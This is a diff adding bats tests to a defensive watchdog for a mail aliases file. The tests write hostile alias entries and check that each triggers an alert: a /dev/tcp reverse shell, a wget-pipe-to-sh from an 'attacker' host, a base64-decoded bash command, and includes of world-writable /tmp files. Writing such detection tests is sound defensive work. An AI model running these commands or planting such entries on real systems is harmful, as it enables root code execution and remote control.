@@ -163,3 +163,70 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — aliases inventory enumerates mail-delivery-trigger root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern in pipe): /dev/tcp reverse shell → alert" {
+    seed_benign
+    run_wd
+    printf 'evil: |bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in pipe): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf 'evil: |wget -qO- http://attacker/p | sh\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in pipe): obfuscation → alert" {
+    seed_benign
+    run_wd
+    printf 'evil: |echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (pipe under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'evil: |/var/tmp/.attacker\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (:include: of a /tmp file → alert): include-axis writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'team: :include:/tmp/.attacker-list\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (:include: of a /var/tmp file → alert): include-axis writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'team: :include:/var/tmp/.attacker-list\n' > "${ALIASES}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-aliases -- ')
+    [ "${main_count}" = "1" ]
+}
